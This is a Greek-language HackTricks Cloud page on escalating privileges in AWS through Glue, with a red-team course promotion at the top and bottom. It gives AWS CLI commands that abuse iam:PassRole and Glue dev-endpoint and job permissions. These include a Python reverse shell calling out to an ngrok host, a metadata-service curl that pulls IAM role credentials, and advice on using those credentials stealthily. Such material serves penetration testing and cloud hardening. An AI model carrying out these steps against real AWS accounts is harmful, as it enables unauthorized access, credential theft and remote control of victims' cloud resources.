# AWS - Ανέβασμα Προνομίων Glue

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Οι χρήστες με αυτές τις άδειες μπορούν να **δημιουργήσουν ένα νέο σημείο ανάπτυξης AWS Glue**, **αναθέτοντας έναν υπάρχοντα ρόλο υπηρεσίας** με συγκεκριμένες άδειες σε αυτό το σημείο.

Μετά την εγκατάσταση, ο **επιτιθέμενος μπορεί να συνδεθεί μέσω SSH στην περίπτωση του σημείου** και να κλέψει τα διαπιστευτήρια IAM του ανατεθειμένου ρόλου:
```bash
# Create endpoint
aws glue create-dev-endpoint --endpoint-name <endpoint-name> \
--role-arn <arn-role> \
--public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
Για λόγους αόρατης εισβολής, συνιστάται να χρησιμοποιείτε τα διαπιστευτήρια IAM από μέσα στην εικονική μηχανή Glue.

**Πιθανές Επιπτώσεις:** Ανέβασμα δικαιωμάτων στον καθορισμένο ρόλο της υπηρεσίας Glue.

### `glue:UpdateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

Οι χρήστες με αυτήν την άδεια μπορούν να **τροποποιήσουν ένα υπάρχον ανάπτυξης Glue** τερματικού SSH, **ενεργοποιώντας την πρόσβαση SSH σε αυτό**. Αυτό επιτρέπει στον επιτιθέμενο να εκτελέσει εντολές με τα προνόμια του ρόλου που είναι συνδεδεμένος με το τερματικό.
```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
--public-key file:///ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
**Πιθανές Επιπτώσεις:** Ανέβασμα δικαιωμάτων στον ρόλο υπηρεσίας του Glue.

### `iam:PassRole`, (`glue:CreateJob` | `glue:UpdateJob`), (`glue:StartJobRun` | `glue:CreateTrigger`)

Οι χρήστες με το δικαίωμα **`iam:PassRole`** σε συνδυασμό με το **`glue:CreateJob` ή `glue:UpdateJob`**, και είτε το **`glue:StartJobRun` είτε το `glue:CreateTrigger`** μπορούν να **δημιουργήσουν ή να ενημερώσουν ένα AWS Glue job**, συνδέοντας οποιονδήποτε λογαριασμό υπηρεσίας Glue και να ξεκινήσουν την εκτέλεση της δουλειάς. Οι δυνατότητες της δουλειάς περιλαμβάνουν την εκτέλεση αυθαίρετου κώδικα Python, τον οποίο μπορεί να εκμεταλλευτεί κάποιος για να δημιουργήσει ένα αντίστροφο κέλυφος. Αυτό το αντίστροφο κέλυφος μπορεί στη συνέχεια να χρησιμοποιηθεί για να αποκτηθούν τα διαπιστευτήρια **IAM** του ρόλου που είναι συνδεδεμένος με τη δουλειά του Glue, οδηγώντας σε πιθανή μη εξουσιοδοτημένη πρόσβαση ή ενέργειες βάσει των δικαιωμάτων αυτού του ρόλου:
```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
--name privesctest \
--role arn:aws:iam::93424712358:role/GlueAdmin \
--command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
--actions '[{"JobName": "privesctest"}]' --start-on-creation \
--schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```
**Πιθανές Επιπτώσεις:** Ανέβασμα δικαιωμάτων στον ρόλο της υπηρεσίας glue που έχει καθοριστεί.

### `glue:UpdateJob`

Μόνο με την άδεια ενημέρωσης, ένας επιτιθέμενος μπορεί να κλέψει τα διαπιστευτήρια IAM του ήδη συνδεδεμένου ρόλου.

**Πιθανές Επιπτώσεις:** Ανέβασμα δικαιωμάτων στον ρόλο της υπηρεσίας glue που έχει συνδεθεί.

## Αναφορές

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
